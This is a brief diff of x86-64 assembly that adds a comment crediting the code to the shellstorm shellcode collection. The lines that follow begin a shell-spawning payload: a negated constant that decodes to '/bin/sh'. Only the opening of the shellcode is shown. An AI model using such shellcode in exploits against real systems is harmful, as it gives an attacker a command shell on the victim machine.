@@ -3,6 +3,8 @@ add al, 0xaf
 mov rsp, rax
 xor rax, rax
 
+    ;Shellcode from here on is from shellstorm by Dad` <3 baboon
+
     xor eax, eax
     mov rbx, 0xFF978CD091969DD1
     neg rbx
